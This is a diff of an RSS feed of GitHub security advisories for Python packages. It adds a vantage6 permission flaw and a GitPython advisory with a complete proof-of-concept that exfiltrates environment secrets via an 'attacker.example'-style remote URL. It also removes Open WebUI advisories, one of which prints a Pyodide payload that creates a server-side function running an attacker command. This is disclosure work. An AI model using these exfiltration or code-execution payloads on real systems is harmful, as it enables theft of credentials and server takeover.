@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-07-24T21:16:37.224Z</updated>
+    <updated>2026-07-24T22:29:08.055Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,174 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[vantage6] vantage6: Algorithm developer can edit another developer's algorithm that is pending / under review]]></title>
+        <id>https://github.com/advisories/GHSA-47w6-gwp4-w6vc</id>
+        <link href="https://github.com/advisories/GHSA-47w6-gwp4-w6vc"/>
+        <updated>2026-07-24T21:49:40.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Edit permission lacks ownership check, so another developer could alter metadata that is later trusted by nodes. </p>
+<p>Worst they could do is update the image or image tag. If that is not noted, another image is approved than the one actually under review</p>
+<h3 id="patches">Patches</h3>
+<p>No</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-47w6-gwp4-w6vc">https://github.com/vantage6/vantage6/security/advisories/GHSA-47w6-gwp4-w6vc</a></li>
+<li><a href="https://github.com/advisories/GHSA-47w6-gwp4-w6vc">https://github.com/advisories/GHSA-47w6-gwp4-w6vc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-47w6-gwp4-w6vc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-24T21:49:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] GitPython: Environment-variable exfiltration via Repo.create_remote() / Remote.add() URL (incomplete fix of GHSA-rwj8-pgh3-r573)]]></title>
+        <id>https://github.com/advisories/GHSA-94p4-4cq8-9g67</id>
+        <link href="https://github.com/advisories/GHSA-94p4-4cq8-9g67"/>
+        <updated>2026-07-24T21:45:20.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The fix for <a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573">GHSA-rwj8-pgh3-r573</a> stopped <code>Repo.clone_from()</code> from running caller-supplied URLs through <code>os.path.expandvars()</code>, but it guarded only that one caller. <code>Remote.create()</code> — reached from the public <code>Repo.create_remote()</code> and its <code>Remote.add()</code> alias — still passes an attacker-influenceable URL through <code>Git.polish_url()</code> with the default <code>expand_vars=True</code>. A URL such as <code>http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git</code> is expanded server-side to embed the hosting process's environment secret, written into <code>.git/config</code>, and then transmitted to the attacker's host on the next <code>fetch</code>/<code>pull</code>. This is the same primitive and same "import repository from URL" threat model the advisory describes, via the sibling caller the fix missed.</p>
+<h2 id="root-cause">Root Cause</h2>
+<p>Fix commit <a href="https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2"><code>8ac5a305</code></a> added an <code>expand_vars</code> parameter to <code>Git.polish_url()</code> (default <code>True</code>) and used <code>expand_vars=False</code> only in <code>Repo._clone()</code> (<a href="https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/repo/base.py#L1455"><code>git/repo/base.py:1455</code></a>). The shared helper's dangerous default was left in place, and the other callers were not updated.</p>
+<p><a href="https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/remote.py#L811"><code>git/remote.py:811</code></a>, <code>Remote.create</code>:</p>
+<pre><code class="language-python">url = Git.polish_url(url)                 # expand_vars=True -&gt; os.path.expandvars(url)
+if not allow_unsafe_protocols:
+    Git.check_unsafe_protocols(url)       # https:// carrying the secret passes
+repo.git.remote(scmd, "--", name, url, **kwargs)   # expanded URL written to .git/config
+</code></pre>
+<p><code>check_unsafe_protocols()</code> runs <em>after</em> expansion here, so it rejects an <code>ext::</code> payload but does nothing about an <code>https://</code> URL that carries an expanded secret in its path or host — the disclosure primitive.</p>
+<p>The same unguarded call also sits at <a href="https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/objects/submodule/base.py#L611"><code>git/objects/submodule/base.py:611</code></a> (<code>Submodule.add</code>), which writes the expanded URL into <code>.gitmodules</code> (a tracked file) and <code>.git/config</code>.</p>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<h3 id="prerequisites">Prerequisites</h3>
+<ul>
+<li>Python 3.9+</li>
+<li><code>git</code> on <code>PATH</code> (for the fetch step)</li>
+<li>GitPython 3.1.53 (installed below)</li>
+</ul>
+<h3 id="step-1-install-gitpython-3153-in-a-clean-venv">Step 1: Install GitPython 3.1.53 in a clean venv</h3>
+<pre><code class="language-bash">mkdir /tmp/gp-remote-poc &amp;&amp; cd /tmp/gp-remote-poc
+python3 -m venv venv
+./venv/bin/pip install gitpython==3.1.53
+</code></pre>
+<h3 id="step-2-write-the-poc">Step 2: Write the PoC</h3>
+<pre><code class="language-bash">cat &gt; poc.py &lt;&lt;'PYEOF'
+#!/usr/bin/env python3
+"""Env-var exfiltration via Repo.create_remote() URL. Sentinel data only."""
+import http.server
+import os
+import tempfile
+import threading
+
+import git
+
+print("gitpython version:", git.__version__)
+
+# Sentinel standing in for a process secret such as AWS_SECRET_ACCESS_KEY.
+SENTINEL = "leaked-a1b2c3-SENTINEL-do-not-use"
+os.environ["GP_SENTINEL_SECRET"] = SENTINEL
+
+# Local HTTP server standing in for attacker.example.
+captured = []
+
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        captured.append(self.path)
+        self.send_response(404)
+        self.end_headers()
+
+    def log_message(self, *a):
+        pass
+
+
+srv = http.server.HTTPServer(("127.0.0.1", 0), Handler)
+port = srv.server_address[1]
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+# Attacker-controlled URL handed to an "import from URL" feature.
+attacker_url = "http://127.0.0.1:%d/steal/${GP_SENTINEL_SECRET}/repo.git" % port
+
+
+def norm(s):  # display the ephemeral listener port as a stable placeholder
+    return s.replace("127.0.0.1:%d" % port, "127.0.0.1:PORT")
+
+
+print("attacker-supplied URL :", norm(attacker_url))
+
+repo = git.Repo.init(tempfile.mkdtemp(prefix="gp-victim-"))
+remote = repo.create_remote("evil", attacker_url)   # public API
+
+stored = repo.remote("evil").url
+print("stored remote URL     :", norm(stored))
+print("SENTINEL in git config:", SENTINEL in stored)
+
+try:
+    remote.fetch()          # transmits the expanded URL to the attacker host
+except Exception:
+    pass                    # fetch fails after the request is already sent
+
+srv.shutdown()
+over_network = any(SENTINEL in p for p in captured)
+print("HTTP paths received   :", [norm(p) for p in captured])
+print("SENTINEL over network :", over_network)
+
+print()
+if SENTINEL in stored and over_network:
+    print("VULNERABLE: env-var expanded into stored URL AND transmitted to attacker host")
+elif SENTINEL in stored:
+    print("VULNERABLE: env-var expanded into stored git-config URL")
+else:
+    print("not reproduced")
+PYEOF
+</code></pre>
+<h3 id="step-3-run-it">Step 3: Run it</h3>
+<pre><code class="language-bash">cd /tmp/gp-remote-poc &amp;&amp; ./venv/bin/python poc.py
+</code></pre>
+<p>Expected output (the listener's ephemeral port is shown as <code>PORT</code>):</p>
+<pre><code>gitpython version: 3.1.53
+attacker-supplied URL : http://127.0.0.1:PORT/steal/${GP_SENTINEL_SECRET}/repo.git
+stored remote URL     : http://127.0.0.1:PORT/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git
+SENTINEL in git config: True
+HTTP paths received   : ['/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git/info/refs?service=git-upload-pack']
+SENTINEL over network : True
+
+VULNERABLE: env-var expanded into stored URL AND transmitted to attacker host
+</code></pre>
+<p>The <code>${GP_SENTINEL_SECRET}</code> token in the supplied URL is replaced with the environment value both in the stored <code>.git/config</code> URL and in the request that reaches the attacker-controlled host.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Pass <code>expand_vars=False</code> at the remaining URL callers, matching the clone fix:</p>
+<ul>
+<li><code>git/remote.py</code> <code>Remote.create</code>: <code>url = Git.polish_url(url, expand_vars=False)</code></li>
+<li><code>git/objects/submodule/base.py</code> <code>Submodule.add</code>: <code>url = Git.polish_url(url, expand_vars=False)</code></li>
+</ul>
+<p>More robustly, flip the <code>Git.polish_url()</code> default to <code>expand_vars=False</code> (env-var expansion on a URL is never desirable for network remotes) and require callers that genuinely normalize local paths to opt in.</p>
+<h2 id="cleanup">Cleanup</h2>
+<pre><code class="language-bash">rm -rf /tmp/gp-remote-poc
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Any secret in the hosting process environment (<code>AWS_SECRET_ACCESS_KEY</code>, <code>GITHUB_TOKEN</code>, CI/CD tokens) is disclosed to an attacker who controls a remote URL passed to <code>Repo.create_remote()</code> / <code>Remote.add()</code>. The secret is expanded into <code>.git/config</code> immediately and transmitted over the network (DNS + HTTP) on the next <code>fetch</code>/<code>pull</code>/<code>remote update</code>. This is the documented "import repository from URL" attacker model of GHSA-rwj8-pgh3-r573 — CI servers, git-hosting mirrors, and dependency scanners — applied to the add-a-remote flow, which the clone-only fix did not cover. The same disclosure reaches <code>.gitmodules</code> (a committable file) via <code>Submodule.add()</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-94p4-4cq8-9g67">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-94p4-4cq8-9g67</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/commit/863417457a0633db7ea5aed4fd01e0b291a41162">https://github.com/gitpython-developers/GitPython/commit/863417457a0633db7ea5aed4fd01e0b291a41162</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.55">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.55</a></li>
+<li><a href="https://github.com/advisories/GHSA-94p4-4cq8-9g67">https://github.com/advisories/GHSA-94p4-4cq8-9g67</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-94p4-4cq8-9g67</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-24T21:45:16.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[open-webui] open-webui terminal proxy path traversal guard bypass via 9x encoded traversal]]></title>
         <id>https://github.com/advisories/GHSA-frvj-c5qp-xj4w</id>
@@ -1296,85 +1464,5 @@ strip_re         = re.compile(r'&lt;\$[^|&gt;]+(?:\|([^&gt;]*))?&gt;')
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-07-24T16:55:30.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[open-webui] Open WebUI: Account enumeration via observable login timing discrepancy]]></title>
-        <id>https://github.com/advisories/GHSA-7rw5-9f7q-xj36</id>
-        <link href="https://github.com/advisories/GHSA-7rw5-9f7q-xj36"/>
-        <updated>2026-07-24T16:55:07.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The <code>/api/v1/auths/signin</code> endpoint leaked whether an email address belonged to a registered account through a response-time side channel. Password verification ran bcrypt only when the email was found in the database; for a non-existent email the request returned early without hashing. The expensive bcrypt comparison therefore made valid-account attempts respond significantly slower (<del>180 ms) than non-existent ones (</del>5 ms), so an unauthenticated attacker could enumerate valid accounts by measuring response time.</p>
-<h3 id="details">Details</h3>
-<p>On signin the backend looked the user up by email and only performed the bcrypt password comparison if a record existed. A missing email short-circuited before any hashing, producing the timing gap. The built-in brute-force throttling did not prevent it: sending one request at a time with a small delay between requests stays under the rate limit while still exposing the difference.</p>
-<p>Observed in the reporter's run (HTTP 400 for every attempt, the response time is the signal):</p>
-<pre><code>Email                Status   Response time
-joe@example.com      400      186 ms   &lt;- valid account
-larry@example.com    400        9 ms
-jose@example.com     400        6 ms
-james@example.com    400        5 ms
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>An unauthenticated attacker can enumerate which email addresses are registered accounts, which enables targeted password-spraying against confirmed accounts. The impact is amplified by MFA not being enabled by default. No data is read or modified; the disclosure is limited to account existence.</p>
-<h3 id="patched">Patched</h3>
-<p>The authentication path now runs a bcrypt verification against a constant placeholder hash whenever the email does not resolve to an active credential, so a real hash comparison executes on every attempt and the response time is the same whether or not the account exists. Fixed in 0.10.0.</p>
-<h3 id="credits">Credits</h3>
-<p>@dievus</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-7rw5-9f7q-xj36">https://github.com/open-webui/open-webui/security/advisories/GHSA-7rw5-9f7q-xj36</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59218">https://nvd.nist.gov/vuln/detail/CVE-2026-59218</a></li>
-<li><a href="https://github.com/open-webui/open-webui/pull/26385">https://github.com/open-webui/open-webui/pull/26385</a></li>
-<li><a href="https://github.com/open-webui/open-webui/commit/993e74912199c66c522f08ec81abe31d76985e39">https://github.com/open-webui/open-webui/commit/993e74912199c66c522f08ec81abe31d76985e39</a></li>
-<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-7rw5-9f7q-xj36">https://github.com/advisories/GHSA-7rw5-9f7q-xj36</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7rw5-9f7q-xj36</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-24T16:55:06.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[open-webui] Open WebUI: Stored web worker XSS via Pyodide]]></title>
-        <id>https://github.com/advisories/GHSA-4r2p-27mh-5m22</id>
-        <link href="https://github.com/advisories/GHSA-4r2p-27mh-5m22"/>
-        <updated>2026-07-24T16:54:42.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>Title:</strong> Same-origin Pyodide code execution allows server-side RCE via a shared chat</p>
-<h3 id="summary">Summary</h3>
-<p>Open WebUI runs client-side Python (Pyodide) in a same-origin web worker. Through Pyodide's JavaScript API (<code>pyodide.http.pyfetch</code>, or the <code>js</code> module which exposes the page's <code>fetch</code> / <code>XMLHttpRequest</code>) executed Python can issue requests on the application origin, and those requests carry the victim's session cookie. A low-privileged user can store such a payload in a chat message, share the chat, and when a victim opens it and clicks <strong>Run</strong> the payload executes authenticated same-origin requests as the victim. When the victim is an admin (or a user holding <code>workspace.functions</code> / <code>workspace.tools</code> permissions) the payload creates a Function/Tool whose body runs server-side, yielding <strong>remote code execution</strong>.</p>
-<h3 id="details">Details</h3>
-<p>Pyodide's <code>js</code> bridge gives Python in the worker the same reach as inline JavaScript on the origin, and the worker is same-origin, so a credentialed request to the app's own API is authenticated as the victim. No separate XSS sink is required: storing the payload in a shared chat and having the victim run it is enough.</p>
-<pre><code class="language-python">from pyodide.http import pyfetch
-import json
-await pyfetch('/api/v1/functions/create', method='POST', credentials='include',
-              headers={'Content-Type': 'application/json'},
-              body=json.dumps({'id': 'x', 'name': 'x', 'meta': {'description': 'x'},
-                               'content': "import os; os.system('&lt;attacker command&gt;')"}))
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>When the victim runs the shared code, an authenticated low-privileged user achieves remote code execution on the server (the created Function/Tool runs server-side Python) if the victim is an admin or holds <code>workspace.functions</code> / <code>workspace.tools</code> permissions. More generally the executed code can issue any authenticated request as the victim. Requires the victim to click Run, and Open WebUI configured to use Pyodide.</p>
-<h3 id="patched">Patched</h3>
-<p>Pyodide now runs in a sandboxed iframe at an opaque origin by default (<code>sandbox="allow-scripts"</code>, no <code>allow-same-origin</code>). At an opaque origin <code>pyfetch</code>, <code>fetch</code> and <code>XMLHttpRequest</code> to the app become cross-origin requests that carry no session cookie and are CORS-blocked, and the <code>js</code> bridge operates on the isolated iframe window with no access to the parent's cookie, token, <code>localStorage</code> or DOM. Full Python, JavaScript and external fetch keep working. IDBFS persistence is available only behind <code>ENABLE_PYODIDE_FILE_PERSISTENCE=true</code>, which restores the same-origin worker and re-accepts this risk.</p>
-<h3 id="workaround">Workaround</h3>
-<p>Until upgraded, disable Pyodide code execution or set the Code Execution / Code Interpreter engine to a server-side option.</p>
-<h3 id="credits">Credits</h3>
-<p>@gg0h</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-4r2p-27mh-5m22">https://github.com/open-webui/open-webui/security/advisories/GHSA-4r2p-27mh-5m22</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59214">https://nvd.nist.gov/vuln/detail/CVE-2026-59214</a></li>
-<li><a href="https://github.com/advisories/GHSA-4r2p-27mh-5m22">https://github.com/advisories/GHSA-4r2p-27mh-5m22</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4r2p-27mh-5m22</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-24T16:54:40.000Z</published>
     </entry>
 </feed>
